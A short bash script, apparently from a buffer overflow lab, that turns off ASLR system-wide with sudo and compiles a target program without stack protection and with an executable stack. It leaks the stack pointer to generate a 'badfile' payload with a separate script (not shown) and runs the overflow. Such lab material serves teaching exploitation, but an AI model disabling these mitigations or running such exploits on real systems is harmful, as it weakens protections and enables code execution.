#!/usr/bin/env bash

ROOT="/tmp/crack"

rm -rf $ROOT

[ -d $ROOT ] || mkdir -p $ROOT

ESP=$ROOT/esp
BUILD_ATTACK=$ROOT/build_attack.py
overflow=$ROOT/overflow

randomize="/proc/sys/kernel/randomize_va_space"

[ 0 -eq `cat $randomize` ] || {
	echo 0 | sudo tee $randomize
}


[ -f $ESP ] || gcc -o $ESP esp.c -m32
[ -f $BUILD_ATTACK ] || cp build_attack.py $BUILD_ATTACK
[ -f $overflow ] || gcc -o $overflow bob.c -fno-stack-protector -z execstack -m32

cd $ROOT

$BUILD_ATTACK `$ESP | awk '{print $NF}'` > $ROOT/badfile

$overflow "`cat $ROOT/badfile`"

